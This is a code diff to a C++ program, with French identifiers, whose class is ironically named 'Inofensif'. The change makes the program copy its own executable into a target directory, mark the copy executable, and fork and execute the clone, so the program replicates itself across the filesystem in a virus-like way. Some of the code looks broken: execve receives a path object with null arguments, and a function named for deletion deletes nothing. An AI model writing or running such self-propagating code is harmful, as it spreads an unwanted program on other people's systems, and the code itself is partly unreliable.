@@ -13,6 +13,7 @@
 #include <fstream>
 #include <vector>
 #include <unistd.h>
+#include <sys/wait.h>
 
 enum class Movement
 {
@@ -33,6 +34,7 @@ class	Inofensif
 		const Movement					movement;
 		std::vector<std::filesystem::path>		vector_path;
 		const std::filesystem::path			dir_target;
+		std::filesystem::path			clone_path; 
 		
 		Movement	choisirMovementAleatoire(void)
 		{
@@ -104,7 +106,7 @@ class	Inofensif
 		void	clone_itself(void)
 		{
 			char			buffer[4000];
-			std::filesystem::path	clone_path = dir_target / "clone";
+			clone_path = dir_target / "clone";
 			std::ofstream		clone(clone_path);
 			std::ifstream		itself("/proc/self/exe");
 			if (debug)
@@ -121,10 +123,23 @@ class	Inofensif
 				std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
 				std::filesystem::perm_options::add);
 			if (debug)
-			{
-			}
+				std::cout << "clone created" << std::endl;
 			itself.close();
 			clone.close();
+		}
+		void	execute_and_delete_program(void)
+		{
+			const	pid_t pid = fork();
+			if (debug)
+				std::cout << "PID = " << pid << std::endl;
+			if (pid == 0)
+			{
+				if (debug)
+					std::cout << "clone path: " << clone_path << std::endl;
+				execve(clone_path, NULL, NULL);
+			}
+			wait(NULL);
+			
 		}
 
 	public:
@@ -135,6 +150,7 @@ class	Inofensif
 			if (debug)
 				std::cout << "le repertoire cible est:___________" << dir_target << std::endl;
 			clone_itself();
+			execute_and_delete_program();
 		}
 };
 
